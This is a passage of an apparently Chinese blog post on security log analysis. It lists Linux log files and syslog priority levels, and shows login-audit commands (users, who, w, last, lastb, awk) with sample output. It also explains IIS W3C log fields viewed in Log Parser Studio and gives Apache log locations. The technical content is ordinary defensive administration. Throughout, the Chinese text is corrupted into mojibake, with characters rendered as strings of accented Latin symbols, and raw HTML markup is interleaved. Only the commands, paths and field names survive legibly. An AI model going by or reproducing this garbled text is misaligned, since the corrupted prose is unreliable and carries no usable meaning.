align="center">è®°å½•ç”¨æˆ·è®¤è¯ç›¸å…³çš„å®‰å…¨äº‹ä»¶ä¿¡æ¯</td></tr><tr><td align="center">/var/log/wtmp</td><td align="center">è®°å½•æ¯ä¸ªç”¨æˆ·ç™»å½•ã€æ³¨é”€åŠç³»ç»Ÿå¯åŠ¨å’Œåœæœºäº‹ä»¶</td></tr><tr><td align="center">/var/log/btmp</td><td align="center">è®°å½•å¤±è´¥çš„ã€é”™è¯¯çš„ç™»å½•å°è¯•åŠéªŒè¯äº‹ä»¶</td></tr></tbody></table><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200219140928.png" style="zoom:80%;"><p>å¯ä»¥çœ‹åˆ°å‘è¡Œç‰ˆæœ¬å·®åˆ«æ—¥å¿—æ–‡ä»¶å¯èƒ½ä¸å°½ç›¸åŒ</p><p><strong>Ubuntuæ—¥å¿—æ–‡ä»¶</strong>ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;var&#x2F;log&#x2F;alternatives.log-æ›´æ–°æ›¿ä»£ä¿¡æ¯éƒ½è®°å½•åœ¨è¿™ä¸ªæ–‡ä»¶ä¸­</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apport.log -åº”ç”¨ç¨‹åºå´©æºƒè®°å½•</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;apt&#x2F;  -ç”¨apt-getå®‰è£…å¸è½½è½¯ä»¶çš„ä¿¡æ¯</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;auth.log  -ç™»å½•è®¤è¯log</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;boot.log  -åŒ…å«ç³»ç»Ÿå¯åŠ¨æ—¶çš„æ—¥å¿—ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;btmp    -è®°å½•æ‰€æœ‰å¤±è´¥å¯åŠ¨ä¿¡æ¯</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;Consolekit  - è®°å½•æ§åˆ¶å°ä¿¡æ¯</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;cpus    - æ¶‰åŠæ‰€æœ‰æ‰“å°ä¿¡æ¯çš„æ—¥å¿—</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;dist-upgrade  - dist-upgradeè¿™ç§æ›´æ–°æ–¹å¼çš„ä¿¡æ¯</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;dmesg    -åŒ…å«å†…æ ¸ç¼“å†²ä¿¡æ¯ï¼ˆkernel ringbufferï¼‰ã€‚åœ¨ç³»ç»Ÿå¯åŠ¨æ—¶ï¼Œæ˜¾ç¤ºå±å¹•ä¸Šçš„ä¸ç¡¬ä»¶æœ‰å…³çš„ä¿¡æ¯</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;dpkg.log  - åŒ…æ‹¬å®‰è£…æˆ–dpkgå‘½ä»¤æ¸…é™¤è½¯ä»¶åŒ…çš„æ—¥å¿—ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;faillog    - åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;fontconfig.log -ä¸å­—ä½“é…ç½®æœ‰å…³çš„logã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;fsck    - æ–‡ä»¶ç³»ç»Ÿæ—¥å¿—</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;faillog  -åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;kern.log â€“åŒ…å«å†…æ ¸äº§ç”Ÿçš„æ—¥å¿—ï¼Œæœ‰åŠ©äºåœ¨å®šåˆ¶å†…æ ¸æ—¶è§£å†³é—®é¢˜ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;lastlog â€”è®°å½•æ‰€æœ‰ç”¨æˆ·çš„æœ€è¿‘ä¿¡æ¯ã€‚è¿™ä¸æ˜¯ä¸€ä¸ªASCIIæ–‡ä»¶ï¼Œå› æ­¤éœ€è¦ç”¨lastlogå‘½ä»¤æŸ¥çœ‹å†…å®¹ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;faillog â€“åŒ…å«ç”¨æˆ·ç™»å½•å¤±è´¥ä¿¡æ¯ã€‚æ­¤å¤–ï¼Œé”™è¯¯ç™»å½•å‘½ä»¤ä¹Ÿä¼šè®°å½•åœ¨æœ¬æ–‡ä»¶ä¸­ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;mail&#x2F; â€“ è¿™ä¸ªå­ç›®å½•åŒ…å«é‚®ä»¶æœåŠ¡å™¨çš„é¢å¤–æ—¥å¿—ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;samba&#x2F; â€“åŒ…å«ç”±sambaå­˜å‚¨çš„ä¿¡æ¯ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;wtmp â€”åŒ…å«ç™»å½•ä¿¡æ¯ã€‚ä½¿ç”¨wtmpå¯ä»¥æ‰¾å‡ºè°æ­£åœ¨ç™»é™†è¿›å…¥ç³»ç»Ÿï¼Œè°ä½¿ç”¨å‘½ä»¤æ˜¾ç¤ºè¿™ä¸ªæ–‡ä»¶æˆ–ä¿¡æ¯ç­‰ã€‚</span><br><span class="line">&#x2F;var&#x2F;log&#x2F;xorg.*.logâ€” æ¥è‡ªXçš„æ—¥å¿—ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><h4 id="æ—¥å¿—çš„ä¼˜å…ˆçº§åˆ«"><a href="#æ—¥å¿—çš„ä¼˜å…ˆçº§åˆ«" class="headerlink" title="æ—¥å¿—çš„ä¼˜å…ˆçº§åˆ«"></a>æ—¥å¿—çš„ä¼˜å…ˆçº§åˆ«</h4><table><thead><tr><th align="center">çº§åˆ«</th><th align="left">è‹±æ–‡å•è¯</th><th align="left">ä¸­æ–‡é‡Šä¹‰</th><th align="left">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">0</td><td align="left">EMERG</td><td align="left">ç´§æ€¥</td><td align="left">ä¼šå¯¼è‡´ä¸»æœºç³»ç»Ÿä¸å¯ç”¨çš„æƒ…å†µ</td></tr><tr><td align="center">1</td><td align="left">ALERT</td><td align="left">è­¦å‘Š</td><td align="left">å¿…é¡»é©¬ä¸Šé‡‡å–æªæ–½è§£å†³çš„é—®é¢˜</td></tr><tr><td align="center">2</td><td align="left">CRIT</td><td align="left">ä¸¥é‡</td><td align="left">æ¯”è¾ƒä¸¥é‡çš„æƒ…å†µ</td></tr><tr><td align="center">3</td><td align="left">ERR</td><td align="left">é”™è¯¯</td><td align="left">è¿è¡Œå‡ºç°é”™è¯¯</td></tr><tr><td align="center">4</td><td align="left">WARNING</td><td align="left">æé†’</td><td align="left">å¯èƒ½å½±å“ç³»ç»ŸåŠŸèƒ½ï¼Œéœ€è¦æé†’ç”¨æˆ·çš„é‡è¦äº‹ä»¶</td></tr><tr><td align="center">5</td><td align="left">NOTICE</td><td align="left">æ³¨æ„</td><td align="left">ä¸ä¼šå½±å“æ­£å¸¸åŠŸèƒ½ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„çš„äº‹ä»¶</td></tr><tr><td align="center">6</td><td align="left">INFO</td><td align="left">ä¿¡æ¯</td><td align="left">ä¸€èˆ¬ä¿¡æ¯</td></tr><tr><td align="center">7</td><td align="left">DEBUG</td><td align="left">è°ƒè¯•</td><td align="left">ç¨‹åºæˆ–ç³»ç»Ÿè°ƒè¯•ä¿¡æ¯ç­‰</td></tr></tbody></table><p>æ•°å­—ç­‰çº§è¶Šå°ï¼Œä¼˜å…ˆçº§è¶Šé«˜ï¼Œæ¶ˆæ¯è¶Šé‡è¦ã€‚</p><h4 id="ä¸‰ç§æ—¥å¿—ç±»å‹"><a href="#ä¸‰ç§æ—¥å¿—ç±»å‹" class="headerlink" title="ä¸‰ç§æ—¥å¿—ç±»å‹"></a>ä¸‰ç§æ—¥å¿—ç±»å‹</h4><p><strong>å†…æ ¸åŠç³»ç»Ÿæ—¥å¿—ï¼š</strong></p><p>è¿™ç§æ—¥å¿—æ•°æ®ç”±ç³»ç»ŸæœåŠ¡<code>rsyslog</code>ç»Ÿä¸€ç®¡ç†ï¼Œæ ¹æ®å…¶ä¸»é…ç½®æ–‡ä»¶<code>/etc/rsyslog.conf</code>ä¸­çš„è®¾ç½®å†³å®šå°†å†…æ ¸æ¶ˆæ¯åŠå„ç§ç³»ç»Ÿç¨‹åºæ¶ˆæ¯è®°å½•åˆ°ä»€ä¹ˆä½ç½®ã€‚ç³»ç»Ÿä¸­æœ‰ç›¸å½“ä¸€éƒ¨åˆ†ç¨‹åºä¼šæŠŠè‡ªå·±çš„æ—¥å¿—æ–‡ä»¶äº¤ç”±<code>rsyslog</code>ç®¡ç†ï¼Œå› è€Œè¿™äº›ç¨‹åºä½¿ç”¨çš„æ—¥å¿—è®°å½•ä¹Ÿå…·æœ‰ç›¸ä¼¼çš„æ ¼å¼ã€‚</p><p><strong>ç”¨æˆ·æ—¥å¿—ï¼š</strong></p><p>è¿™ç§æ—¥å¿—æ•°æ®ç”¨äºè®°å½•<code>Linux</code>æ“ä½œç³»ç»Ÿç”¨æˆ·ç™»å½•åŠé€€å‡ºç³»ç»Ÿçš„ç›¸å…³ä¿¡æ¯ï¼ŒåŒ…æ‹¬ç”¨æˆ·åã€ç™»å½•çš„ç»ˆç«¯ã€ç™»å½•æ—¶é—´ã€æ¥æºä¸»æœºã€æ­£åœ¨ä½¿ç”¨çš„è¿›ç¨‹æ“ä½œç­‰ã€‚</p><p><strong>ç¨‹åºæ—¥å¿—ï¼š</strong></p><p>æœ‰äº›åº”ç”¨ç¨‹åºä¼šé€‰æ‹©ç”±è‡ªå·±ç‹¬ç«‹ç®¡ç†ä¸€ä»½æ—¥å¿—æ–‡ä»¶ï¼ˆè€Œä¸æ˜¯äº¤ç»™<code>rsyslog</code>æœåŠ¡ç®¡ç†ï¼‰ï¼Œç”¨äºè®°å½•æœ¬ç¨‹åºè¿è¡Œè¿‡ç¨‹ä¸­çš„å„ç§äº‹ä»¶ä¿¡æ¯ã€‚ç”±äºè¿™äº›ç¨‹åºåªè´Ÿè´£ç®¡ç†è‡ªå·±çš„æ—¥å¿—æ–‡ä»¶ï¼Œå› æ­¤ä¸åŒç¨‹åºæ‰€ä½¿ç”¨çš„æ—¥å¿—è®°å½•æ ¼å¼å¯èƒ½ä¼šå­˜åœ¨è¾ƒå¤§çš„å·®å¼‚ã€‚</p><h4 id="ä¸€äº›å‘½ä»¤"><a href="#ä¸€äº›å‘½ä»¤" class="headerlink" title="ä¸€äº›å‘½ä»¤"></a>ä¸€äº›å‘½ä»¤</h4><p><strong>users</strong></p><p><code>users</code>å‘½ä»¤åªæ˜¯ç®€å•åœ°è¾“å‡ºå½“å‰ç™»å½•çš„ç”¨æˆ·åç§°ï¼Œæ¯ä¸ªæ˜¾ç¤ºçš„ç”¨æˆ·åå¯¹åº”ä¸€ä¸ªç™»å½•ä¼šè¯ã€‚å¦‚æœä¸€ä¸ªç”¨æˆ·æœ‰ä¸æ­¢ä¸€ä¸ªç™»å½•ä¼šè¯ï¼Œé‚£ä»–çš„ç”¨æˆ·åå°†æ˜¾ç¤ºä¸å…¶ç›¸åŒçš„æ¬¡æ•°ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu-virtual-machine:~$ users</span><br><span class="line">ubuntu</span><br></pre></td></tr></table></figure><p><strong>who</strong></p><p><code>who</code>å‘½ä»¤ç”¨äºæŠ¥å‘Šå½“å‰ç™»å½•åˆ°ç³»ç»Ÿä¸­çš„æ¯ä¸ªç”¨æˆ·çš„ä¿¡æ¯ã€‚ä½¿ç”¨è¯¥å‘½ä»¤ï¼Œç³»ç»Ÿç®¡ç†å‘˜å¯ä»¥æŸ¥çœ‹å½“å‰ç³»ç»Ÿå­˜åœ¨å“ªäº›ä¸åˆæ³•ç”¨æˆ·ï¼Œä»è€Œå¯¹å…¶è¿›è¡Œå®¡è®¡å’Œå¤„ç†ã€‚<code>who</code>çš„é»˜è®¤è¾“å‡ºåŒ…æ‹¬ç”¨æˆ·åã€ç»ˆç«¯ç±»å‹ã€ç™»å½•æ—¥æœŸåŠè¿œç¨‹ä¸»æœºã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@ubuntu-virtual-machine:~$ who</span><br><span class="line">ubuntu   tty7         2020-02-03 03:50 (:0)</span><br></pre></td></tr></table></figure><p><strong>w</strong></p><p><code>w</code>å‘½ä»¤ç”¨äºæ˜¾ç¤ºå½“å‰ç³»ç»Ÿä¸­çš„æ¯ä¸ªç”¨æˆ·åŠå…¶æ‰€è¿è¡Œçš„è¿›ç¨‹ä¿¡æ¯ï¼Œæ¯”<code>users</code>ã€<code>who</code>å‘½ä»¤çš„è¾“å‡ºå†…å®¹è¦ä¸°å¯Œä¸€äº›ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@MoonBack:~<span class="comment"># w</span></span><br><span class="line"> 14:26:21 up 86 days,  5:32,  2 users,  load average: 0.02, 0.06, 0.02</span><br><span class="line">USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line">root     pts/0    127.0.0.1     13:43   42:53   0.54s  0.02s -bash</span><br><span class="line">root     pts/1    127.0.0.1     14:22    0.00s  0.02s  0.00s w</span><br></pre></td></tr></table></figure><p><strong>last</strong></p><p><code>last</code>å‘½ä»¤ç”¨äºæŸ¥è¯¢æˆåŠŸç™»å½•åˆ°ç³»ç»Ÿçš„ç”¨æˆ·è®°å½•ï¼Œæœ€è¿‘çš„ç™»å½•æƒ…å†µå°†æ˜¾ç¤ºåœ¨æœ€å‰é¢ã€‚é€šè¿‡<code>last</code>å‘½ä»¤å¯ä»¥åŠæ—¶æŒæ¡<code>Linux</code>ä¸»æœºçš„ç™»å½•æƒ…å†µï¼Œè‹¥å‘ç°æœªç»æˆæƒçš„ç”¨æˆ·ç™»å½•è¿‡ï¼Œåˆ™è¡¨ç¤ºå½“å‰ä¸»æœºå¯èƒ½å·²è¢«å…¥ä¾µã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@MoonBack:~<span class="comment"># last</span></span><br><span class="line">root     pts/1        127.0.0.1   Wed Feb 19 14:22   still logged <span class="keyword">in</span></span><br><span class="line">root     pts/1        127.0.0.1   Wed Feb 19 14:04 - 14:09  (00:04)</span><br><span class="line">root     pts/0        127.0.0.1   Wed Feb 19 13:43   still logged <span class="keyword">in</span></span><br></pre></td></tr></table></figure><p><strong>lastb</strong></p><p><code>lastb</code>å‘½ä»¤ç”¨äºæŸ¥è¯¢ç™»å½•å¤±è´¥çš„ç”¨æˆ·è®°å½•ï¼Œå¦‚ç™»å½•çš„ç”¨æˆ·åé”™è¯¯ã€å¯†ç ä¸æ­£ç¡®ç­‰æƒ…å†µéƒ½å°†è®°å½•åœ¨æ¡ˆã€‚ç™»å½•å¤±è´¥çš„æƒ…å†µå±äºå®‰å…¨äº‹ä»¶ï¼Œå› ä¸ºè¿™è¡¨ç¤ºå¯èƒ½æœ‰äººåœ¨å°è¯•çŒœè§£ä½ çš„å¯†ç ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@MoonBack:~<span class="comment"># lastb</span></span><br><span class="line">user     ssh:notty    113.163.171.134  Wed Feb 19 05:39 - 05:39  (00:00)</span><br><span class="line">user     ssh:notty    113.163.171.134  Wed Feb 19 05:39 - 05:39  (00:00)</span><br><span class="line">admin    ssh:notty    14.169.178.174   Wed Feb 19 01:19 - 01:19  (00:00)</span><br><span class="line">admin    ssh:notty    14.169.178.174   Wed Feb 19 01:19 - 01:19  (00:00)</span><br><span class="line">admin    ssh:notty    14.169.178.174   Wed Feb 19 01:19 - 01:19  (00:00)</span><br><span class="line">admin    ssh:notty    14.169.178.174   Wed Feb 19 01:19 - 01:19  (00:00)</span><br></pre></td></tr></table></figure><p><strong>awk</strong></p><p><code>awk</code>æ˜¯ä¸€ä¸ªå¼ºå¤§çš„æ–‡æœ¬åˆ†æå·¥å…·</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">last -n 5 | awk  <span class="string">&#x27;&#123;print $1&#125;&#x27;</span><span class="comment">#æ˜¾ç¤ºæœ€è¿‘ç™»é™†çš„5ä¸ªç”¨æˆ·,$1å®æŒ‡ä¼ è¿‡æ¥çš„ç¬¬ä¸€ä¸ªå‚æ•°</span></span><br><span class="line">awk -F <span class="string">&#x27;/&#x27;</span>  <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> <span class="built_in">log</span> | head -10<span class="comment">#å¯¹logæ–‡ä»¶ç”¨/åˆ†å‰²å–å‰10è¡Œçš„ç¬¬ä¸€åˆ—</span></span><br><span class="line">awk <span class="string">&#x27;&#123;print substr($1,5,5)&#125;&#x27;</span> <span class="built_in">log</span> | tail -10 <span class="comment">#æˆªå–ç¬¬ä¸€åˆ—å10è¡Œä»ç¬¬äº”ä¸ªå­—ç¬¦å¼€å§‹çš„äº”ä¸ªå­—ç¬¦</span></span><br></pre></td></tr></table></figure><h2 id="webæ—¥å¿—"><a href="#webæ—¥å¿—" class="headerlink" title="webæ—¥å¿—"></a>webæ—¥å¿—</h2><h3 id="IIS"><a href="#IIS" class="headerlink" title="IIS"></a>IIS</h3><h4 id="æ—¥å¿—ä½ç½®"><a href="#æ—¥å¿—ä½ç½®" class="headerlink" title="æ—¥å¿—ä½ç½®"></a>æ—¥å¿—ä½ç½®</h4><p>IISçš„æ—¥å¿—æ–‡ä»¶é»˜è®¤ç›®å½•ä¸º<code>C:\inetpub\logs\LogFiles</code>ï¼Œå¯é€šè¿‡<code>Internet Information Services(IIS)</code>ç®¡ç†å™¨æŸ¥çœ‹ï¼Œé»˜è®¤é‡‡ç”¨<strong>W3C</strong>æ ¼å¼</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200219155033.png" style="zoom:80%;"><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200219155513.png" style="zoom:80%;"><h4 id="Log-Parser-Studio"><a href="#Log-Parser-Studio" class="headerlink" title="Log Parser Studio"></a>Log Parser Studio</h4><ol><li><p>éœ€è¦å…ˆå®‰è£…<code>Log Parser</code><br>ä¸‹è½½åœ°å€ï¼š<a href="http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&id=24659">http://www.microsoft.com/en-us/download/details.aspx?displaylang=en&amp;id=24659</a></p></li><li><p>å®‰è£…<code>Log Parser Studio</code></p><p>ä¸‹è½½åœ°å€ï¼š<a href="http://gallery.technet.microsoft.com/Log-Parser-Studio-cd458765">http://gallery.technet.microsoft.com/Log-Parser-Studio-cd458765</a></p></li></ol><p>å®‰è£…å®Œæˆç¬¬ä¸€ä¸ªæ–‡ä»¶ä¹‹åï¼Œè§£å‹ç¬¬äºŒä¸ªæ–‡ä»¶ï¼Œç›´æ¥è¿è¡ŒLPS.exeå³å¯ã€‚</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200219194535.png" style="zoom:80%;"><p>æ–°å»ºä¸€ä¸ªæŸ¥è¯¢</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200219195013.png" style="zoom:80%;"><p>å°†<code>[LOGFILEPATH]</code>æ›¿æ¢æˆæ—¥å¿—çš„è·¯å¾„</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200219195437.png" style="zoom:80%;"><p>å°±å¯ä»¥å˜æˆç›´è§‚çš„è¡¨æ ¼å½¢å¼äº†</p><p><strong>å­—æ®µå‰ç¼€è¯´æ˜ï¼š</strong></p><table><thead><tr><th align="center">å‰ç¼€</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">s-</td><td align="center">æœåŠ¡å™¨æ“ä½œ</td></tr><tr><td align="center">c-</td><td align="center">å®¢æˆ·ç«¯æ“ä½œ</td></tr><tr><td align="center">cs-</td><td align="center">å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨çš„æ“ä½œ</td></tr><tr><td align="center">sc-</td><td align="center">æœåŠ¡å™¨åˆ°å®¢æˆ·ç«¯çš„æ“ä½œ</td></tr></tbody></table><p><strong>å„ä¸ªå­—æ®µè¯´æ˜ï¼š</strong></p><table><thead><tr><th align="center">å­—æ®µ</th><th align="center">è¯´æ˜</th></tr></thead><tbody><tr><td align="center">date</td><td align="center">æ—¥æœŸï¼Œè¡¨ç¤ºæ´»åŠ¨å‘ç”Ÿçš„æ—¥æœŸã€‚</td></tr><tr><td align="center">time</td><td align="center">æ—¶é—´ï¼Œè¡¨ç¤ºæ´»åŠ¨å‘ç”Ÿçš„æ—¶é—´ã€‚</td></tr><tr><td align="center">s-sitename</td><td align="center">æœåŠ¡åï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯æ‰€è®¿é—®çš„è¯¥ç«™ç‚¹çš„ Internet æœåŠ¡å’Œå®ä¾‹çš„å·ç ã€‚</td></tr><tr><td align="center">s-computername</td><td align="center">æœåŠ¡å™¨åï¼Œè¡¨ç¤ºç”Ÿæˆæ—¥å¿—é¡¹çš„æœåŠ¡å™¨åç§°ã€‚</td></tr><tr><td align="center">s-ip</td><td align="center">æœåŠ¡å™¨IPï¼Œè¡¨ç¤ºç”Ÿæˆæ—¥å¿—é¡¹çš„æœåŠ¡å™¨çš„IPåœ°å€ã€‚</td></tr><tr><td align="center">cs-method</td><td align="center">æ–¹æ³•ï¼Œä¾‹å¦‚GETæˆ–POSTã€‚</td></tr><tr><td align="center">cs-uri-stem</td><td align="center">URIèµ„æºï¼Œè¡¨ç¤ºè¯·æ±‚è®¿é—®çš„åœ°å€ã€‚</td></tr><tr><td align="center">cs-uri-query</td><td align="center">URIæŸ¥è¯¢ï¼Œè¡¨ç¤ºæŸ¥è¯¢HTTPè¯·æ±‚ä¸­é—®å·ï¼ˆ?ï¼‰åçš„ä¿¡æ¯ã€‚</td></tr><tr><td align="center">s-port</td><td align="center">æœåŠ¡å™¨ç«¯å£ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯è¿æ¥çš„æœåŠ¡å™¨ç«¯å£å·ã€‚</td></tr><tr><td align="center">cs-username</td><td align="center">é€šè¿‡éªŒè¯çš„åŸŸæˆ–ç”¨æˆ·åï¼Œå¯¹äºé€šè¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œæ ¼å¼æ˜¯<code>åŸŸ\ç”¨æˆ·å</code>ï¼›å¯¹äºåŒ¿åç”¨æˆ·ï¼Œæ˜¯ä¸€ä¸ªè¿å­—ç¬¦ (-)ã€‚</td></tr><tr><td align="center">c-ip</td><td align="center">å®¢æˆ·ç«¯IPï¼Œè¡¨ç¤ºè®¿é—®æœåŠ¡å™¨çš„å®¢æˆ·ç«¯çœŸå®IP åœ°å€ã€‚</td></tr><tr><td align="center">cs-version</td><td align="center">åè®®ç‰ˆæœ¬ï¼Œä¾‹å¦‚ HTTP 1.0 æˆ– HTTP 1.1ã€‚</td></tr><tr><td align="center">user-agent</td><td align="center">ç”¨æˆ·ä»£ç†ï¼Œè¡¨ç¤ºåœ¨å®¢æˆ·ç«¯ä½¿ç”¨çš„æµè§ˆå™¨ã€‚</td></tr><tr><td align="center">Cookie</td><td align="center">Cookieï¼Œè¡¨ç¤ºå‘é€æˆ–æ¥å—çš„Cookieå†…å®¹ï¼Œå¦‚æœæ²¡æœ‰Cookieï¼Œåˆ™æ˜¾ç¤ºè¿å­—ç¬¦ï¼ˆ-ï¼‰ã€‚</td></tr><tr><td align="center">referer</td><td align="center">å¼•ç”¨ç«™ç‚¹ï¼Œè¡¨ç¤ºç”¨æˆ·è®¿é—®çš„å‰ä¸€ä¸ªç«™ç‚¹ã€‚æ­¤ç«™ç‚¹æä¾›åˆ°å½“å‰ç«™ç‚¹åˆ°é“¾æ¥ã€‚</td></tr><tr><td align="center">cs-host</td><td align="center">ä¸»æœºï¼Œè¡¨ç¤ºä¸»æœºå¤´å†…å®¹ã€‚</td></tr><tr><td align="center">sc-status</td><td align="center">åè®®è¿”å›çŠ¶æ€ï¼Œè¡¨ç¤ºHTTPæˆ–FTPçš„æ“ä½œçŠ¶æ€ã€‚</td></tr><tr><td align="center">sc-substatus</td><td align="center">HTTPå­åè®®çš„çŠ¶æ€ã€‚</td></tr><tr><td align="center">sc-win32-status</td><td align="center">win32çŠ¶æ€ï¼Œå³ç”¨ Windowsä½¿ç”¨çš„æœ¯è¯­è¡¨ç¤ºçš„æ“ä½œçš„çŠ¶æ€ã€‚</td></tr><tr><td align="center">sc-bytes</td><td align="center">æœåŠ¡å™¨å‘é€å­—èŠ‚ã€‚</td></tr><tr><td align="center">cs-bytes</td><td align="center">æœåŠ¡å™¨æ¥æ”¶å­—èŠ‚ã€‚</td></tr><tr><td align="center">time-taken</td><td align="center">æ‰€ç”¨æ—¶é—´ï¼Œå³æ“ä½œæ‰€èŠ±æ—¶é—´é•¿çŸ­ï¼Œå•ä½ä¸ºæ¯«ç§’ã€‚</td></tr></tbody></table><p>æ›´å¤šå†…å®¹å‚è§ï¼š<a href="https://www.alibabacloud.com/help/zh/doc-detail/84813.htm">https://www.alibabacloud.com/help/zh/doc-detail/84813.htm</a></p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><h4 id="linuxæ—¥å¿—ä½ç½®"><a href="#linuxæ—¥å¿—ä½ç½®" class="headerlink" title="linuxæ—¥å¿—ä½ç½®"></a>linuxæ—¥å¿—ä½ç½®</h4><p>å¦‚æœé‡‡ç”¨<code>RPM</code>åŒ…å®‰è£…ï¼Œé»˜è®¤æƒ…å†µä¸‹ç›®å½•/usr ç”¨æ¥å­˜æ”¾åº”ç”¨ç¨‹åºï¼Œç›®å½•<code>/etc/apache2</code>æˆ–è€…<code>/etc/httpd</code>å­˜æ”¾è½¯ä»¶çš„é…ç½®æ–‡ä»¶</p><p>å¦‚æœé‡‡ç”¨æºä»£ç å®‰è£…ï¼Œä¸€èˆ¬é»˜è®¤å®‰è£…åœ¨<code>/usr/local/apache2</code>ç›®å½•ä¸‹</p><p>æ‰¾ä¸åˆ°æˆ‘ä»¬å¯ä»¥ç”¨findå‘½ä»¤</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -name apache2</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæˆ‘ç”¨dockeræ­å»ºçš„lampå‘ç°æ—¥å¿—æ–‡ä»¶ä½äº<code>/var/log/apache2</code>ç›®å½•ä¸‹</p><p><code>access.log</code>è®°å½•ç€httpè¯·æ±‚</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/TIMæˆªå›¾20200219214509.png" style="zoom:80%;"><h4 id="windowsæ—¥å¿—ä½ç½®"><a href="#windowsæ—¥å¿—ä½ç½®" class="headerlink" title="windowsæ—¥å¿—ä½ç½®"></a>windowsæ—¥å¿—ä½ç½®</h4><p>å®‰è£…å®Œ<code>apache</code>åç›®å½•ç»“æ„ï¼š</p><img src="/2020/02/18/%E6%97%A5%E5%BF%97%E5%92%8C%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/1433350-158961037560e2e4.webp.jpg" style="zoom:80%;"><p>æ—¥å¿—æ–‡ä»¶ä½äº<code>logs</code>ç›®å½•ä¸‹</p><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><h4 